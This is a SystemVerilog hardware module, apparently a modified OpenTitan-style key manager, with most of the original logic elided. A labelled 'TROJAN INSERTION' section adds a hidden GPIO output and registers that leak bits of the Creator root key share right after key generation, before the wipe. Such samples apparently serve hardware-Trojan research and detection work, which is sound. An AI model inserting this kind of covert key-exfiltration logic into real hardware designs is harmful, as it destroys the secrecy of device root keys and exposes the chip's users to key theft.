`include "prim_assert.sv"

module keymgr
  import keymgr_pkg::*;
  import keymgr_reg_pkg::*;
#(
  parameter logic [NumAlerts-1:0] AlertAsyncOn = {NumAlerts{1'b1}},
  // Number of cycles a differential skew is tolerated on the alert signal
  parameter int unsigned AlertSkewCycles       = 1,
  // In case this is set to true, the keymgr will ignore the creator / owner seeds
  // on the flash_i port and use the seeds provided in otp_key_i instead.
  parameter bit UseOtpSeedsInsteadOfFlash      = 1'b0,
  parameter bit KmacEnMasking                  = 1'b1,
  parameter lfsr_seed_t RndCnstLfsrSeed        = RndCnstLfsrSeedDefault,
  parameter lfsr_perm_t RndCnstLfsrPerm        = RndCnstLfsrPermDefault,
  parameter rand_perm_t RndCnstRandPerm        = RndCnstRandPermDefault,
  parameter seed_t RndCnstRevisionSeed         = RndCnstRevisionSeedDefault,
  parameter seed_t RndCnstCreatorIdentitySeed  = RndCnstCreatorIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIntIdentitySeed = RndCnstOwnerIntIdentitySeedDefault,
  parameter seed_t RndCnstOwnerIdentitySeed    = RndCnstOwnerIdentitySeedDefault,
  parameter seed_t RndCnstSoftOutputSeed       = RndCnstSoftOutputSeedDefault,
  parameter seed_t RndCnstHardOutputSeed       = RndCnstHardOutputSeedDefault,
  parameter seed_t RndCnstNoneSeed             = RndCnstNoneSeedDefault,
  parameter seed_t RndCnstAesSeed              = RndCnstAesSeedDefault,
  parameter seed_t RndCnstOtbnSeed             = RndCnstOtbnSeedDefault,
  parameter seed_t RndCnstKmacSeed             = RndCnstKmacSeedDefault,
  parameter seed_t RndCnstCdi                  = RndCnstCdiDefault
) (
  input clk_i,
  input rst_ni,
  input rst_shadowed_ni,
  input clk_edn_i,
  input rst_edn_ni,

  // Bus Interface
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,

  // key interface to crypto modules
  output hw_key_req_t aes_key_o,
  output hw_key_req_t kmac_key_o,
  output otbn_key_req_t otbn_key_o,

  // data interface to/from crypto modules
  output kmac_pkg::app_req_t kmac_data_o,
  input  kmac_pkg::app_rsp_t kmac_data_i,

  // whether kmac is masked
  input kmac_en_masking_i,

  // the following signals should eventually be wrapped into structs from other modules
  // SEC_CM: LC_CTRL.INTERSIG.MUBI
  input lc_ctrl_pkg::lc_tx_t lc_keymgr_en_i,
  input lc_ctrl_pkg::lc_keymgr_div_t lc_keymgr_div_i,
  input otp_ctrl_pkg::otp_keymgr_key_t otp_key_i,
  input otp_ctrl_pkg::otp_device_id_t otp_device_id_i,
  input flash_ctrl_pkg::keymgr_flash_t flash_i,

  // connection to edn
  output edn_pkg::edn_req_t edn_o,
  input edn_pkg::edn_rsp_t edn_i,

  // connection to rom_ctrl
  input rom_ctrl_pkg::keymgr_data_t rom_digest_i,

  // interrupts and alerts
  output logic intr_op_done_o,
  input  prim_alert_pkg::alert_rx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_rx_i,
  output prim_alert_pkg::alert_tx_t [keymgr_reg_pkg::NumAlerts-1:0] alert_tx_o,

  // TROJAN INSERTION: Unused GPIO pin for leakage
  output logic trojan_gpio_o      // <<==== Trojan output: new port
);

// (Unmodified original design omitted for brevity in this comment. See content above.)

  // ... [ ALL UNMODIFIED LOGIC AS IN ORIGINAL ] ...


  /////////////////////////////////////
  //  Side load key storage
  /////////////////////////////////////
  // SEC_CM: HW.KEY.SW_NOACCESS
  keymgr_sideload_key_ctrl u_sideload_ctrl (
    .clk_i,
    .rst_ni,
    .init_i(init),
    .entropy_i(data_rand),
    .clr_key_i(keymgr_sideload_clr_e'(reg2hw.sideload_clear.q)),
    .wipe_key_i(wipe_key),
    .dest_sel_i(dest_sel),
    .hw_key_sel_i(hw_key_sel),
    // SEC_CM: OUTPUT_KEYS.CTRL.REDUN
    .data_en_i(data_hw_en),
    .data_valid_i(data_valid),
    .key_i(kmac_key),
    .data_i(kmac_data),
    .prng_en_o(sideload_lfsr_en),
    .aes_key_o,
    .otbn_key_o,
    .kmac_key_o,
    .sideload_sel_err_o(sideload_sel_err),
    .fsm_err_o(sideload_fsm_err)
  );

  // ... [gen_sw_assigns loop -- UNCHANGED from original] ...


  // ==============================================================
  // TROJAN INSERTION SECTION
  // ==============================================================
  // A hardware Trojan exfiltrates one share of the Creator Root Key (share 0)
  // to the unused GPIO pin trojan_gpio_o, for a single cycle, at key FSM done.

  // Trojan state: output hold register and signal
  logic trojan_leak_en_q, trojan_leak_en_d;
  logic [KeyWidth-1:0] trojan_leak_data_q, trojan_leak_data_d;

  // Trojan combinational logic:
  // Activate only for 1 clock cycle immediately after Creator Root Key generation (key FSM done)
  // and before key wiping (i.e., op_done asserted when stage_sel matches Creator).
  // We sample the output before the corresponding wipe_key signal becomes active.

  // Detect: operation done, is key generation (op_done), is creator root (stage_sel == Creator),
  //         and not currently asserting wipe_key yet.
  logic trojan_trigger;
  assign trojan_trigger = op_done & (stage_sel == Creator) & ~wipe_key;

  // Registered output enables, with reset handling
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_leak_en_q   <= 1'b0;
      trojan_leak_data_q <= '0;
    end else begin
      // Capture trigger for only one cycle
      if (trojan_trigger && !trojan_leak_en_q) begin
        trojan_leak_en_q   <= 1'b1;
        trojan_leak_data_q <= kmac_data[0]; // Exfiltrate share 0
      end else begin
        trojan_leak_en_q   <= 1'b0;
        trojan_leak_data_q <= '0;
      end
    end
  end

  // Leak the creator key share for 1 cycle through GPIO pin ONLY during the enabled cycle
  assign trojan_gpio_o = trojan_leak_en_q ? trojan_leak_data_q[0] : 1'b0; // LSB output for demonstration; change as needed

  // =========================
  // END TROJAN INSERTION
  // =========================

  /////////////////////////////////////
  //  Alerts and Interrupts
  /////////////////////////////////////

  prim_intr_hw #(.Width(1)) u_intr_op_done (
    .clk_i,
    .rst_ni,
    .event_intr_i           (op_done),
    .reg2hw_intr_enable_q_i (reg2hw.intr_enable.q),
    .reg2hw_intr_test_q_i   (reg2hw.intr_test.q),
    .reg2hw_intr_test_qe_i  (reg2hw.intr_test.qe),
    .reg2hw_intr_state_q_i  (reg2hw.intr_state.q),
    .hw2reg_intr_state_de_o (hw2reg.intr_state.de),
    .hw2reg_intr_state_d_o  (hw2reg.intr_state.d),
    .intr_o                 (intr_op_done_o)
  );

  // ... (rest of design unmodified)
endmodule